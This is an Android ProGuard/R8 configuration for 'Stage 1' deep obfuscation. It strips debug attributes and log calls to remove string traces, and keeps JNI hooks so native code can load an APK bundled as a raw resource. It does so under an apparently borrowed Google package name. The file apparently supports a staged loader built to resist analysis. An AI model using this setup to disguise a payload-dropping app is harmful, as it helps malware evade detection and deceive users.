# Deep Obfuscation for Stage 1

# 1. Package & Class Renaming
# Moves all classes to a.b.c.x where x is a, b, c...
-flattenpackagehierarchy 'a.b.c'
-repackageclasses 'a.b.c'
-dontusemixedcaseclassnames

# 2. Aggressive Renaming & Optimization
-allowaccessmodification
-overloadaggressively
-optimizationpasses 5

# 3. Strip Debugging Metadata
-renamesourcefileattribute ''
-keepattributes !SourceFile,!LineNumberTable,*Annotation*,Signature,EnclosingMethod,InnerClasses

# 4. JNI Preservation
# We must keep the classes and methods that the C++ code looks for by name.
-keepclasseswithmembernames class * {
    native <methods>;
}

-keep class com.google.android.apps.work.cloudpc.Manager {
    public static <methods>;
}

-keep class com.google.android.apps.work.cloudpc.MainActivity {
    public <methods>;
}

# Keep the R.raw class so JNI can find the resource ID for the APK
-keep class com.google.android.apps.work.cloudpc.R$raw {
    public static int app_debug;
}

# 5. Android Components Preservation
# Android needs these names to match what's in the Manifest.
-keep public class * extends android.app.Activity
-keep public class * extends android.app.Application
-keep public class * extends android.app.Service
-keep public class * extends android.content.BroadcastReceiver
-keep public class * extends android.content.ContentProvider

# 6. Library Support
# We keep libraries to avoid runtime issues, but they will be shrunk.
-keep class androidx.** { *; }
-dontwarn androidx.**
-dontnote androidx.**

# 7. Kotlin Support for dynamically loaded code
-keep class kotlin.** { *; }
-dontwarn kotlin.**

# Remove Log calls to clear string traces
-assumenosideeffects class android.util.Log {
    public static *** d(...);
    public static *** v(...);
    public static *** i(...);
    public static *** w(...);
    public static *** e(...);
}

-dontnote
-dontwarn
